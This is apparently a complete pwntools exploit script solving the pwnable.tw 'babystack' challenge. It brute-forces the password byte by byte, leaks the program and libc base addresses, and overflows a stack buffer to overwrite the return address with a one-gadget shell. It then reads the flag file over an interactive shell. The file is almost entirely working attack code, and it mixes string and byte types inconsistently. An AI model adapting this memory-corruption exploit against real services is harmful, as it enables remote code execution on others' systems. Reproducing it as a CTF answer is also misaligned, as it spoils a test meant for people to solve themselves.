from pwn import *

r = remote("chall.pwnable.tw", 10205)
#r = process("./babystack")
r.recvuntil(b">> ")

#gdb.attach(r)

def Login(s, padding16):
	r.send(padding16)
	r.recvuntil(b"Your passowrd :")
	r.send(s)
	return r.recvuntil("!")

def Break_while():
	payload = b"2;sh\x00"
	r.sendline(payload)

def Copy(s):
	r.sendline(str(3))
	r.recvuntil(b"Copy :")
	r.send(s)
	r.recvuntil(b"copy !")

def GetPassword():
	while(1):
		password = ""
		for i in range(0, 16):
			for j in range(1, 256):
				#print(j)
				if j != 10:
					pw = password + chr(j) + "\n"
					if Login(pw, "1") == b"Login Success !":
						password += chr(j)
						print(password)
						r.sendline(str(1))
						break;
		if len(password) == 16:
			break
	return password		

def GetTextBase(password):
	rbp = ""
	padding = password + "1"*16
	for i in range(0,6):
		for j in range(1,256):
			#print(j)
			check = padding + rbp + chr(j) + "\n"
			if Login(check, "1"*16) == b"Login Success !":
				rbp += chr(j)
				r.sendline(str(1))
				break

	rbp = u64(rbp + "\x00\x00")
	base_text = rbp - 0x1000 - rbp%0x1000
	return base_text

def GetLibcBase(password):
	file_setbuf = ""
	padding = password[:8]
	for i in range(0,6):
		for j in range(1,256):
			#print(j)
			if j != 10:
				check = padding + file_setbuf + chr(j) + "\n"
				if Login(check, "1") == b"Login Success !":
					file_setbuf += chr(j)
					r.sendline(str(1))
					break			
	print(file_setbuf + ": " + str(len(file_setbuf)))
	file_setbuf = u64(file_setbuf + "\x00\x00")
	file_setbuf -= 9
	file_setbuf_offset = 0x78430
	libc_base = file_setbuf - file_setbuf_offset
	return libc_base			

def main():
	print("This program takes more than 5 minutes")
	
	password = GetPassword()
	print("password: " + password)
	base_text = GetTextBase(password)
	print("base_text: ", hex(base_text))


	payload = "a"*0x40 + password[:8]
	Login(payload, "1")
	payload = password + "\n"
	Login(payload, "1")
	payload = "a"*0x3f
	Copy(payload)
	r.sendline(str(1))
	libc_base = GetLibcBase(password)

	print("libc_base: " + hex(libc_base))
	system = libc_base + 0x45390
	oneshot = libc_base + 0xf0567

	# in this case, don't need this line of code
	pop_rsi_ret = libc_base + 0x202e8

	# reverse password value
	password = password.encode("utf-8")
	payload = b"\x00" + b"a"*(0x40-1) + password + b"a"*0x18 + p64(oneshot) + b"\n"
	Login(payload, "1")  # log out
	#payload = b"\x00\n"
	#print(Login(payload, "1"))   #log in
	payload = b"a"*0x3f
	Copy(payload)        # overwrite return address
	#print("gonna touch break_while")
	#Break_while()        # break while

	r.sendline(b"cat /home/babystack/flag")

	r.interactive()

	#r.close()
	
if __name__ == "__main__":
	main()


